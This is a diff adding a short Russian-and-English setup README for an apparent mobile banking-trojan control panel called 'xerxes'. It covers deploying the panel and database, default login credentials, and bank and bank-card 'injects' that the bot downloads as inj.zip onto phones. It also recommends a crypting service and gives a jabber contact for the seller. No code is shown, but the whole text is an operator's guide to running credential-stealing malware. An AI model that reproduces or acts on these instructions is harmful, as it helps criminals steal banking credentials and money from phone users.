@@ -1,0 +1,26 @@
+Заливаем админ панель на сервер,хостинг.
+Загружаем базу из папки  config (база db.sql)
+Переходим по ссылки, ваш ip/xerxes/ или домен/xerxes/
+Логин do-your-best Пароль 1
+Меняем пароль в админ панели.
+
+Образец инжектов находится в папке inj, инжекты для банковских карт отличаются от банковских. 
+Бот скачивает архив inj.zip и распаковывает на телефоне.
+
+Для нормальной работы рекомендуется использовать API script service
+
+Контакты для связи jabber: napas@jabb.im
+
+
+Load the admin panel on the server, hosting.
+Load the database from the config folder (db database.sql)
+Go to the link, your ip / xerxes / or domain / xerxes/
+Login do-your-best Password 1
+Change the password in the admin panel.
+
+The sample inject is located in the ini folder, the injects for Bank cards are different from the Bank ones.
+The bot downloads the file inj.zip and unpack on your phone.
+
+For normal operation, it is recommended to use API cript service
+
+Contact jabber: napas@jabb.im
